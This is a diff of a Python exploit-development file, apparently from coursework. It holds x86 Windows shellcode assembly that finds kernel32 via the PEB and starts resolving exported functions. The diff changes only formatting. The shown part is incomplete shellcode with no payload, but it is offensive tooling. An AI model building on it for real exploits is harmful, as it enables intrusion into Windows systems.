@@ -7,7 +7,7 @@ CODE = (
     " start:                             "  #
     #"   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
     "   mov   ebp, esp                  ;"  #
-    "   add esp, 0xfffff9f0             ;"  #
+    "   add   esp, 0xfffff9f0           ;"  #
 
     " find_kernel32:                     "  #
     "   xor   ecx, ecx                  ;"  #   ECX = 0
@@ -17,11 +17,11 @@ CODE = (
     
     " next_module:                      "   #
     "   mov   ecx, [esi+8h]             ;"  # avoiding bad char
-    "   mov    ebx, ecx                 ;"
+    "   mov   ebx, ecx                  ;"
     "   xor   ecx, ecx                  ;"  #   ECX = 0    
     "   mov   edi, esi                  ;"
-    "   add     edi, 0x1f               ;"
-    "   inc     edi                     ;"
+    "   add   edi, 0x1f               	;"
+    "   inc   edi                     	;"
     "   mov   edi, [edi]                ;"
     "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
     "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
@@ -31,31 +31,31 @@ CODE = (
     "   jmp callback                    ;"
 
     "   find_function_ret:              "
-    "   pop edi                         ;"
-    "   mov esi, edi                    ;"
-    "   mov dword ptr[ebp+0x4], esi     ;"
-    "   jmp resolve_k32_sym             ;"
+    "   pop 	edi                     ;"
+    "   mov 	esi, edi                ;"
+    "   mov 	dword ptr[ebp+0x4], esi ;"
+    "   jmp 	resolve_k32_sym         ;"
 
     "   callback:                       "
     "   call find_function_ret          ;"
 
     "   find_function:                  "
-    "   add esp, 0x4                    ;"
-    "   pop eax                         ;"
-    "   push -0x1                       ;"
-    "   add esp, eax                    ;"
+    "   add 	esp, 0x4                ;"
+    "   pop 	eax                     ;"
+    "   push 	-0x1                    ;"
+    "   add 	esp, eax                ;"
 
     "   find_function_loop2:            "
-    "   mov eax, [ebx+0x3c]             ;"
-    "   mov edi, [ebx+eax+0x78]         ;"
-    "   add edi, ebx                    ;"
-    "   mov ecx, [edi+0x18]             ;"
-    "   mov esi, edi                    ;"
-    "   add esi, 0x1f                   ;"
-    "   inc esi                         ;"
-    "   mov eax, [esi]                  ;"
-    "   add eax, ebx                    ;"
-    "   mov [ebp-0x4], eax              ;"
+    "   mov 	eax, [ebx+0x3c]         ;"
+    "   mov 	edi, [ebx+eax+0x78]     ;"
+    "   add 	edi, ebx                ;"
+    "   mov 	ecx, [edi+0x18]         ;"
+    "   mov 	esi, edi                ;"
+    "   add 	esi, 0x1f               ;"
+    "   inc 	esi                     ;"
+    "   mov 	eax, [esi]              ;"
+    "   add 	eax, ebx                ;"
+    "   mov 	[ebp-0x4], eax          ;"
 
     "   find_function_loop:             "
     "   add ecx, -0x1                   ;"
